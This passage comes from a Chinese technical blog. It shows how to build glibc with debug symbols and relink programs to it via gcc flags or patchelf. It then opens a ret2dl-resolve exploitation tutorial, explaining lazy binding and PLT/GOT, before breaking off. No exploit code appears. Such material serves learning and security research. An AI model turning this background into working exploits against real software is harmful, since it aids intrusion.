(<span class="number">0xf7f33000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xf7d3b000</span>)</span><br><span class="line">        /lib/ld-linux.so<span class="number">.2</span> (<span class="number">0xf7f35000</span>)</span><br></pre></td></tr></table></figure>
<table>
<colgroup>
<col style="width: 12%" />
<col style="width: 46%" />
<col style="width: 40%" />
</colgroup>
<thead>
<tr>
<th></th>
<th>libc</th>
<th>ld</th>
</tr>
</thead>
<tbody>
<tr>
<td>32位程序</td>
<td>/lib/i386-linux-gnu/libc.so.6</td>
<td>/lib/ld-linux.so.2</td>
</tr>
<tr>
<td>64位程序</td>
<td>/lib/x86_64-linux-gnu/libc.so.6</td>
<td>/lib64/ld-linux-x86-64.so.2</td>
</tr>
</tbody>
</table>
<p>这是安装ubuntu这种发行版时系统自带的glibc-release版</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/lib/i386-linux-gnu<span class="meta"># file ld-2.27.so</span></span><br><span class="line">ld<span class="number">-2.27</span>.so: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, BuildID[sha1]=<span class="number">8</span>da666988713e9bb88f4eb5d27dc35d815cf006b, stripped</span><br></pre></td></tr></table></figure>
<p>可以看到调试符号信息已经被strip了</p>
<p>就算我们编译一个c程序时加入了-g选项,也只是保留了程序领空内的所有符号信息,该程序链接的glibc照样是没有调试符号的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info sharedlibrary</span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line"><span class="number">0xf7fd6ab0</span>  <span class="number">0xf7ff18bb</span>  Yes (*)     /lib/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xf7df4690</span>  <span class="number">0xf7f414b6</span>  Yes (*)     /lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">(*): Shared library is missing debugging information.</span><br></pre></td></tr></table></figure>
<p>两个库都标着*,意思是缺乏调试信息</p>
<p>如果我们想要调试glibc,或者说能够保留glibc中的符号,比如函数名,变量名之类,需要带有符号的glibc</p>
<p>可以自己编译一个玩</p>
<p>以我的wsl kali-linux为例,装机自带的libc版本号是2.38</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(dustball㉿Destroyer)-[~]</span><br><span class="line">└─$ ldd --version</span><br><span class="line"><span class="title function_">ldd</span> <span class="params">(Debian GLIBC <span class="number">2.38</span><span class="number">-13</span>)</span> 2.38</span><br><span class="line"><span class="title function_">Copyright</span> <span class="params">(C)</span> 2023 Free Software Foundation, Inc.</span><br><span class="line">This is <span class="built_in">free</span> software; see the source <span class="keyword">for</span> copying conditions.  There is NO</span><br><span class="line">warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure>
<p>下面我们编译一个新的带有调试符号的2.38版本的glibc</p>
<h2 id="编译64位glibc">编译64位glibc</h2>
<h3 id="下载glibc">下载glibc</h3>
<p>首先下载glibc源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install glibc-source</span><br></pre></td></tr></table></figure>
<p>执行完后会在/usr/src下面生成glibc目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/usr/src/glibc]</span><br><span class="line">└─# ls</span><br><span class="line">debian  glibc-2.38.tar.xz</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这个方法不太靠谱，我在另一台机器的wsl上这样整，缺少texinfo源代码</p>
<p>还是到仓库下载源代码稳妥</p>
</blockquote>
<p>或者到glibc仓库<a
target="_blank" rel="noopener" href="http://ftp.gnu.org/gnu/glibc/">http://ftp.gnu.org/gnu/glibc/</a>挑一个下载</p>
<p>或者到镜像仓库下载https://mirrors.aliyun.com/gnu/glibc/</p>
<p>比如</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ftp.gnu.org/gnu/glibc/glibc-2.38.tar.xz -o glibc-2.38.tar.xz</span><br></pre></td></tr></table></figure>
<h3 id="解压glibc">解压glibc</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xf glibc<span class="number">-2.38</span>.tar.xz</span><br></pre></td></tr></table></figure>
<h3 id="建立bulid目录">建立bulid目录</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd glibc-2.38</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br></pre></td></tr></table></figure>
<h3 id="配置编译选项">配置编译选项</h3>
<p>在build路径下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/glibc/ --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/glibc32/glibc-2.38 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.35 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.27 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.31 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.35 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>
<p>这里<code>--prefix=/home/glibc</code>是决定<code>make install</code>的安装地址</p>
<p><code>–-enable-debug</code>允许调试,实际上就是给gcc传递-g编译选项</p>
<h3 id="编译安装">编译&amp;安装</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j `nproc`</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果配置编译选项时prefix没有写或者写错了也没关系</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install DESTDIR=/home/glibc/</span><br></pre></td></tr></table></figure>
<p>这样安装也可以</p>
</blockquote>
<p>如果编译和安装都没有错误,会在<code>/home/glibc/</code>下生成我们的货</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc]</span><br><span class="line">└─<span class="meta"># ls</span></span><br><span class="line">bin  etc  include  lib  libexec  sbin  share  var</span><br></pre></td></tr></table></figure>
<p>动态库在lib下面放着了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc/lib]</span><br><span class="line">└─<span class="meta"># file libc.so.6</span></span><br><span class="line">libc.so<span class="number">.6</span>: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux), dynamically linked, interpreter /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=a8ebdd4a75fecb70ba9fe1dc5765fcd87c77742e, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
<p>非常滴漂亮</p>
<h2 id="交叉编译32位glibc可选">交叉编译32位glibc(可选)</h2>
<p>在x86_64 linux上,也兼容32位的程序</p>
<p>如果想要32位带符号glibc的支持,需要再编译一个32位的glibc</p>
<p>下载和解压不用做了,还是利用之前编译64位glibc时的源码即可</p>
<h3 id="建立build32目录">建立build32目录</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd glibc<span class="number">-2.38</span></span><br><span class="line">mkdir build32</span><br><span class="line">cd build32</span><br></pre></td></tr></table></figure>
<h3 id="配置32位编译选项">配置32位编译选项</h3>
<p>首先让gcc能够编译32位程序,需要安装一些依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install build-essential module-assistant gcc-multilib g++-multilib </span><br></pre></td></tr></table></figure>
<p>然后配置编译选项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/glibc32 --host=i686-pc-linux-gnu --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --with-binutils=/usr/bin --with-headers=/usr/include --build=i686-linux-gnu CC=&quot;gcc -m32&quot; CXX=&quot;g++ -m32&quot;</span><br></pre></td></tr></table></figure>
<h3 id="编译安装-1">编译&amp;安装</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j`nproc`</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>如果编译安装都没有错误,会在/home/glibc32下面生成我们的货</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home]</span><br><span class="line">└─# ls</span><br><span class="line">dustball  glibc  glibc32</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc32/lib]</span><br><span class="line">└─<span class="meta"># file libc.so.6</span></span><br><span class="line">libc.so<span class="number">.6</span>: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=<span class="number">3</span>d4a2e7c0e16c8cc778b5bd574a59eb4988e2d96, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
<p>漂亮滴很</p>
<h2 id="编译链接glibc">编译链接glibc</h2>
<p>现在系统里面有两个glibc</p>
<p>一个系统自带的没有调试符号的glibc在/lib下面</p>
<p>一个我们自己编译的有调试符号的glibc在/home/glibc下面</p>
<p>但是天无二日,程序只能链接一个glibc,并且程序默认链接到/lib下的老太阳</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># ldd main</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff451fb000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007f93106d0000</span>)</span><br><span class="line">        /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f93108c0000</span>)</span><br></pre></td></tr></table></figure>
<p>如何让程序链接到我们自己编译的glibc呢?</p>
<p>gcc有一个编译选项可以指定链接libc的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -o main -Wl,--rpath=/home/glibc/lib -Wl,--dynamic-linker=/home/glibc/lib/ld-linux-x86-64.so.2   -I/home/glibc/include -g -no-pie</span><br></pre></td></tr></table></figure>
<p><code>-Wl,--rpath=/home/glibc/lib</code>指定glibc路径</p>
<p><code>-Wl,--dynamic-linker=/home/glibc/lib/ld-linux-x86-64.so.2</code>指定动态链接器的路径</p>
<p><code>-I/home/glibc/include</code>指定头文件路径</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─# ./main</span><br><span class="line">Hello, world!</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># file main</span></span><br><span class="line">main: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">27284e24</span>ab02fa64103591192dd8b3b006ae20f5, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># ldd main</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007ffe18b9d000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/glibc/lib/libc.so<span class="number">.6</span> (<span class="number">0x00007f1a6a9ec000</span>)</span><br><span class="line">        /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f1a6abc6000</span>)</span><br></pre></td></tr></table></figure>
<p>libc和动态链接器都改好了</p>
<p>如果想要编译成32位程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -o main -Wl,--rpath=/home/glibc32/lib -Wl,--dynamic-linker=/home/glibc32/lib/ld-linux.so.2   -I/home/glibc/include -g -no-pie -m32</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─# ./main</span><br><span class="line">Hello, world!</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─# ┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># file main</span></span><br><span class="line">main: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/glibc32/lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=c2629c0f00b91e2caa60e88d0d27198bc71ff49c, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># ldd main</span></span><br><span class="line">        linux-gate.so<span class="number">.1</span> (<span class="number">0xf7ef7000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/glibc32/lib/libc.so<span class="number">.6</span> (<span class="number">0xf7cd0000</span>)</span><br><span class="line">        /home/glibc32/lib/ld-linux.so<span class="number">.2</span> =&gt; /lib/ld-linux.so<span class="number">.2</span> (<span class="number">0xf7ef9000</span>)</span><br></pre></td></tr></table></figure>
<p>libc和动态链接器都改好了</p>
<p>此时使用gdb调试程序也是可以看到动态链接器的源码的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240813215802807.png"
alt="image-20240813215802807" />
<figcaption aria-hidden="true">image-20240813215802807</figcaption>
</figure>
<p>也可以看到ld中的符号<code>link_map</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info types link_map</span><br><span class="line">All types matching regular expression <span class="string">&quot;link_map&quot;</span>:</span><br><span class="line"></span><br><span class="line">File ../elf/link.h:</span><br><span class="line"><span class="number">101</span>:    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_public</span>;</span></span><br><span class="line"></span><br><span class="line">File ../include/link.h:</span><br><span class="line"><span class="number">95</span>:     <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>;</span></span><br><span class="line"><span class="number">286</span>:    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_reldeps</span>;</span></span><br><span class="line"></span><br><span class="line">File ../nptl_db/db_info.c:</span><br><span class="line"><span class="number">40</span>:     <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> <span class="title">link_map</span>;</span></span><br><span class="line"></span><br><span class="line">File ../sysdeps/x86/linkmap.h:</span><br><span class="line"><span class="number">10</span>:     <span class="class"><span class="keyword">struct</span> <span class="title">link_map_machine</span>;</span></span><br></pre></td></tr></table></figure>
<h2 id="patch-elf修改程序链接glibc">patch-elf修改程序链接glibc</h2>
<p>对于一个已经编译链接完毕,默认链接系统自带glibc的程序,如何让它使用我们编译的glibc呢</p>
<p>可以使用patch-elf修改程序，一是修改libc所在目录的位置，二是修改使用的链接器的绝对地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-rpath /home/glibc/lib/ --<span class="built_in">set</span>-interpreter /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> main</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# make main</span><br><span class="line">gcc main.c -o main -no-pie -g -O0</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# make ldd</span><br><span class="line">ldd main</span><br><span class="line">        linux-vdso.so.1 (0x00007fff8e1b2000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f02aebae000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f02aedb3000)</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# make patch</span><br><span class="line">patchelf --set-rpath /home/glibc/lib/ --set-interpreter /home/glibc/lib/ld-linux-x86-64.so.2 main</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# make ldd</span><br><span class="line">ldd main</span><br><span class="line">        linux-vdso.so.1 (0x00007fff70bfc000)</span><br><span class="line">        libc.so.6 =&gt; /home/glibc/lib/libc.so.6 (0x00007f8ab9eef000)</span><br><span class="line">        /home/glibc/lib/ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f8aba126000)</span><br><span class="line">        </span><br><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# ./main</span><br><span class="line">helloworld</span><br></pre></td></tr></table></figure>
<p>改完了之后ldd观察结果和在编译链接时指定我们的glibc效果是一样的</p>
<p>虽然改完了ld的地址看上去还是指向原来那个<code>/home/glibc/lib/ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2</code></p>
<p>但是调试观察实际上已经改过了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info sharedlibrary </span><br><span class="line">From                To                  Syms Read   Shared Object Library</span><br><span class="line">0x00007f5aff5a5000  0x00007f5aff5c8f91  Yes         /home/glibc/lib/ld-linux-x86-64.so.2</span><br><span class="line">0x00007f5aff38f3c0  0x00007f5aff4d8c9d  Yes         /home/glibc/lib/libc.so.6</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/ret2dl-resolve/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/ret2dl-resolve/" class="post-title-link" itemprop="url">ret2dl-resolve</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-17 23:19:00 / Modified: 23:26:12" itemprop="dateCreated datePublished" datetime="2024-10-17T23:19:00+08:00">2024-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2dl-resolve">ret2dl-resolve</h1>
<p>在学习这部分之前，最好有带调试符号的libc和ld,</p>
<p>也就是说自己编译一个待调试符号的glibc</p>
<p>然后编译链接程序时指定使用我们的glibc,不用系统自带那个</p>
<p>或者用patchelf把程序链接的glibc调包</p>
<p>然而调试版和发行版调用的函数好像不太一样</p>
<h2 id="延迟绑定">延迟绑定</h2>
<p>假设有程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello, world!\n&quot;</span>, <span class="number">14</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -O0 -g -no-pie -m32 -o test</span><br></pre></td></tr></table></figure>
<p>write函数位于libc.so中，main程序是如何与write符号链接的呢？</p>
<p>这个过程叫做延迟绑定，又叫做懒加载，意思是我们的程序第一次调用动态库中的符号时，动态连接器ld才会解析write函数</p>
<p>这个解析过程如下</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A1.png"
alt="第一次解析" />
<figcaption aria-hidden="true">第一次解析</figcaption>
</figure>
<p>经过第一次解析,write@got被填充了正确的write地址,此后的write调用将如图所示</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A2.png"
alt="此后的调用" />
<figcaption aria-hidden="true">此后的调用</figcaption>
</figure>
<p>这里面提到了两个表，PLT表，GOT表</p>
<p>如果gdb加了pwndbg插件，可以使用plt和got命令观察两者</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; elfheader</span><br><span class="line">0x8048194 - 0x80481b4  .interp</span><br><span class="line">0x80481b4 - 0x80481d8  .note.gnu.build-id</span><br><span class="line">0x80481d8 - 0x80481f8  .note.ABI-tag</span><br><span class="line">0x80481f8 - 0x8048218  .gnu.hash</span><br><span class="line">0x8048218 - 0x8048268  .dynsym</span><br><span class="line">0x8048268 - 0x80482d1  .dynstr</span><br><span class="line">0x80482d2 - 0x80482dc  .gnu.version</span><br><span class="line">0x80482dc - 0x804830c  .gnu.version_r</span><br><span class="line">0x804830c - 0x8048314  .rel.dyn</span><br><span class="line">0x8048314 - 0x8048324  .rel.plt</span><br><span class="line">0x8049000 - 0x8049020  .init</span><br><span class="line">0x8049020 - 0x8049050  .plt</span><br><span class="line">0x8049050 - 0x80491a6  .text</span><br><span class="line">0x80491a8 - 0x80491bc  .fini</span><br><span class="line">0x804a000 - 0x804a013  .rodata</span><br><span class="line">0x804a014 - 0x804a048  .eh_frame_hdr</span><br><span class="line">0x804a048 - 0x804a110  .eh_frame</span><br><span class="line">0x804bef8 - 0x804befc  .init_array</span><br><span class="line">0x804befc - 0x804bf00  .fini_array</span><br><span class="line">0x804bf00 - 0x804bff0  .dynamic</span><br><span class="line">0x804bff0 - 0x804bff4  .got</span><br><span class="line">0x804bff4 - 0x804c008  .got.plt</span><br><span class="line">0x804c008 - 0x804c010  .data</span><br><span class="line">0x804c010 - 0x804c014  .bss</span><br><span class="line"></span><br><span class="line">pwndbg&gt; plt</span><br><span class="line">0x8049030: __libc_start_main@plt</span><br><span class="line">0x8049040: <span class="built_in">printf</span>@plt</span><br><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT <span class="built_in">functions</span>: 2</span><br><span class="line"></span><br><span class="line">[0x804c000] __libc_start_main@GLIBC_2.34 -&gt; 0xf7cf8cf0 (__libc_start_main_impl) ◂— push   ebp</span><br><span class="line">[0x804c004] <span class="built_in">printf</span>@GLIBC_2.0 -&gt; 0x8049046 (<span class="built_in">printf</span>@plt+6) ◂— push   8</span><br></pre></td></tr></table></figure>
<h3 id="plt的作用">PLT的作用</h3>
<p>对每一个glibc中的函数func,都会有一个plt表项</p>
